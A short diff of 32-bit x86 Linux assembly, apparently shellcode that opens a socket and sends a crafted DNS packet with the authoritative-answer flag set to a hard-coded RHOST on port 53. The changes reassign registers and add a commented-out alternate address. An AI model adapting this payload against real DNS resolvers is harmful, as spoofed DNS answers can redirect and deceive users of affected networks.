@@ -34,7 +34,7 @@ socket:
 	mov  al, 0x66
 	mov  ecx, esp
 	int  0x80
-	xchg eax, ebx
+	xchg eax, edi
 	pop  ebp
 
 sendto:
@@ -53,18 +53,19 @@ sendto:
 	push dx               ; q.flags = 0x4 (AA)
 	push si               ; q.id = non-deterministic
 	mov  esi, esp
+;	push dword 0x03a0f280
 	push dword 0x0100007f ; RHOST
 	mov  dh, 0x35         ; RPORT (53)
 	push dx
 	push bp
-	mov  edi, esp
+	mov  ebx, esp
 	push byte 0x10
-	push edi
+	push ebx
 	cdq
 	push edx
 	push byte 0x19        ; size of the dns request
 	push esi
-	push ebx
+	push edi
 	mov  ecx, esp
 	push byte 0xb
 	pop  ebx
